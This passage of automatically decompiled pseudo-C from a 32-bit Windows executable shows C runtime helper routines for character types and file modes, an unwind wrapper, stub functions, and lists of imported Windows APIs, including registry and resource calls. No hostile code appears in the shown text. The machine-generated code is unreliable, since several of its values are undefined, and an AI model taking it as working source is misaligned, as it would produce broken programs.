            // 0x4064d4
            v3 = (int32_t)(*(char *)(g31 + 2 * result) & 2);
        } else {
            // 0x4064c8
            int32_t v4; // 0x406489
            v3 = function_406555(result, 2, v4);
        }
        // 0x4064df
        if (v3 == 0) {
            // 0x406552
            return result;
        }
        // 0x4064df
        v2 = g75;
    }
    int32_t v5 = result / 256; // 0x4064ef
    char v6 = *(char *)(g31 + (2 * v5 & 510 | 1)); // 0x4064f5
    int32_t v7 = v6 > -1 ? 1 : 2;
    v1 = 0x1000000 * (v6 > -1 ? result : v5) / 0x1000000;
    int32_t v8; // bp-8, 0x406489
    int32_t v9 = function_4060f1(v2, 512, (char *)&v1, v7, &v8, 3, 0, 1, (int32_t)&g110); // 0x40652e
    if (v9 == 0) {
        // 0x406552
        return result;
    }
    int32_t result2; // 0x406489
    if (v9 != 1) {
        // 0x406545
        unsigned char v10; // 0x406489
        result2 = v8 & 255 | 256 * (int32_t)v10;
    } else {
        // 0x40653f
        result2 = v8 & 255;
    }
    // 0x406552
    return result2;
}

// Address range: 0x406555 - 0x4065ca
int32_t function_406555(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a2;
    if (a1 < 256) {
        // 0x4065c5
        return (int32_t)*(int16_t *)(g31 + 2 * a1) & a3;
    }
    int32_t v2 = a1 / 256; // 0x40657c
    char v3 = *(char *)(g31 + (2 * v2 & 510 | 1)); // 0x406582
    int32_t v4 = 0x1000000 * (v3 > -1 ? a1 : v2) / 0x1000000;
    int32_t result = function_406340(1, (char *)&v4, v3 > -1 ? 1 : 2, &v1, 0, 0, 1); // 0x4065b3
    if (result == 0) {
        // 0x4065bf
        return result;
    }
    // 0x4065c5
    return v1 & 0xffff & a3;
}

// Address range: 0x4065ca - 0x406640
int32_t function_4065ca(uint32_t a1, int32_t a2) {
    // 0x4065ca
    if ((int32_t)g98 <= a1) {
        // 0x40663b
        g49 = 9;
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g96); // 0x4065df
    char * v2 = (char *)(v1 + (8 * a1 & 248 | 4)); // 0x4065ea
    unsigned char v3 = *v2; // 0x4065ea
    if ((v3 & 1) == 0) {
        // 0x40663b
        g49 = 9;
        return -1;
    }
    if (a2 == 0x8000) {
        // 0x406617
        *v2 = v3 & 127;
        return v3 > 255 ? 0x8000 : 0x4000;
    }
    // 0x40660a
    if (a2 != 0x4000) {
        // 0x40663b
        g49 = 22;
        return -1;
    }
    // 0x406617
    *v2 = v3 | -128;
    return v3 > -1 ? 0x8000 : 0x4000;
}

// Address range: 0x406640 - 0x406646
void _RtlUnwind_40_16(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue) {
    // 0x406640
    RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);
}

// Address range: 0x187e4d9 - 0x187e4da
int32_t function_187e4d9(void) {
    // 0x187e4d9
    int32_t result; // 0x187e4d9
    return result;
}

// Address range: 0x287ad37 - 0x287ad38
int32_t function_287ad37(void) {
    // 0x287ad37
    int32_t result; // 0x287ad37
    return result;
}

// Address range: 0x287e307 - 0x287e308
int32_t function_287e307(void) {
    // 0x287e307
    int32_t result; // 0x287e307
    return result;
}

// --------------- Statically Linked Functions ----------------

// int32_t __amsg_exit(void);
// int32_t __aulldiv(void);
// int32_t __aullrem(int32_t a1, int32_t a2);
// int32_t __global_unwind2(void);
// int32_t __local_unwind2(void);
// int32_t __NLG_Notify(void);
// int32_t _flsall(int32_t a1);
// void * malloc(size_t size);

// --------------- Dynamically Linked Functions ---------------

// BOOL CloseHandle(_In_ HANDLE hObject);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// VOID ExitProcess(_In_ UINT uExitCode);
// HRSRC FindResourceA(_In_opt_ HMODULE hModule, _In_ LPCSTR lpName, _In_ LPCSTR lpType);
// BOOL FlushFileBuffers(_In_ HANDLE hFile);
// BOOL FreeEnvironmentStringsA(_In_ LPCH penv);
// BOOL FreeEnvironmentStringsW(_In_ LPWCH penv);
// BOOL FreeResource(_In_ HGLOBAL hResData);
// LPSTR GetCommandLineA(VOID);
// BOOL GetCPInfo(_In_ UINT CodePage, _Out_ LPCPINFO lpCPInfo);
// HANDLE GetCurrentProcess(VOID);
// LPCH GetEnvironmentStrings(VOID);
// LPWCH GetEnvironmentStringsW(void);
// DWORD GetEnvironmentVariableA(_In_opt_ LPCSTR lpName, LPSTR lpBuffer, _In_ DWORD nSize);
// DWORD GetFileType(_In_ HANDLE hFile);
// DWORD GetLastError(VOID);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetStartupInfoA(_Out_ LPSTARTUPINFOA lpStartupInfo);
// HANDLE GetStdHandle(_In_ DWORD nStdHandle);
// BOOL GetStringTypeA(_In_ LCID Locale, _In_ DWORD dwInfoType, LPCSTR lpSrcStr, _In_ int cchSrc, _Out_ LPWORD lpCharType);
// BOOL GetStringTypeW(_In_ DWORD dwInfoType, LPCWCH lpSrcStr, _In_ int cchSrc, _Out_ LPWORD lpCharType);
// NOT_BUILD_WINDOWS_DEPRECATE DWORD GetVersion(VOID);
// NOT_BUILD_WINDOWS_DEPRECATE BOOL GetVersionExA(_Inout_ LPOSVERSIONINFOA lpVersionInformation);
// LPVOID HeapAlloc(_In_ HANDLE hHeap, _In_ DWORD dwFlags, _In_ SIZE_T dwBytes);
// HANDLE HeapCreate(_In_ DWORD flOptions, _In_ SIZE_T dwInitialSize, _In_ SIZE_T dwMaximumSize);
// BOOL HeapDestroy(_In_ HANDLE hHeap);
// BOOL HeapFree(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, LPVOID lpMem);
// LPVOID HeapReAlloc(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, LPVOID lpMem, _In_ SIZE_T dwBytes);
// int LCMapStringA(_In_ LCID Locale, _In_ DWORD dwMapFlags, LPCSTR lpSrcStr, _In_ int cchSrc, LPSTR lpDestStr, _In_ int cchDest);
// int LCMapStringW(_In_ LCID Locale, _In_ DWORD dwMapFlags, LPCWSTR lpSrcStr, _In_ int cchSrc, LPWSTR lpDestStr, _In_ int cchDest);
// HMODULE LoadLibraryA(_In_ LPCSTR lpLibFileName);
// HGLOBAL LoadResource(_In_opt_ HMODULE hModule, _In_ HRSRC hResInfo);
// LPVOID LockResource(_In_ HGLOBAL hResData);
// int MultiByteToWideChar(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCCH lpMultiByteStr, _In_ int cbMultiByte, LPWSTR lpWideCharStr, _In_ int cchWideChar);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// LSTATUS RegCreateKeyExA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey, DWORD Reserved, _In_opt_ LPSTR lpClass, _In_ DWORD dwOptions, _In_ REGSAM samDesired, _In_opt_ const LPSECURITY_ATTRIBUTES lpSecurityAttributes, _Out_ PHKEY phkResult, _Out_opt_ LPDWORD lpdwDisposition);
// LSTATUS RegSetValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
// VOID RtlUnwind(_In_opt_ PVOID TargetFrame, _In_opt_ PVOID TargetIp, _In_opt_ PEXCEPTION_RECORD ExceptionRecord, _In_ PVOID ReturnValue);
// BOOL SetEndOfFile(_In_ HANDLE hFile);
// DWORD SetFilePointer(_In_ HANDLE hFile, _In_ LONG lDistanceToMove, _Inout_opt_ PLONG lpDistanceToMoveHigh, _In_ DWORD dwMoveMethod);
// UINT SetHandleCount(_In_ UINT uNumber);
// BOOL SetStdHandle(_In_ DWORD nStdHandle, _In_ HANDLE hHandle);
// DWORD SizeofResource(_In_opt_ HMODULE hModule, _In_ HRSRC hResInfo);
// BOOL TerminateProcess(_In_ HANDLE hProcess, _In_ UINT uExitCode);
// LONG UnhandledExceptionFilter(_In_ struct _EXCEPTION_POINTERS * ExceptionInfo);
// LPVOID VirtualAlloc(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
// BOOL VirtualFree(LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD dwFreeType);
// int WideCharToMultiByte(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCWCH lpWideCharStr, _In_ int cchWideChar, LPSTR lpMultiByteStr, _In_ int cbMultiByte, _In_opt_ LPCCH lpDefaultChar, _Out_opt_ LPBOOL lpUsedDefaultChar);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (6.0)
// Detected language: C++
// Detected functions: 115
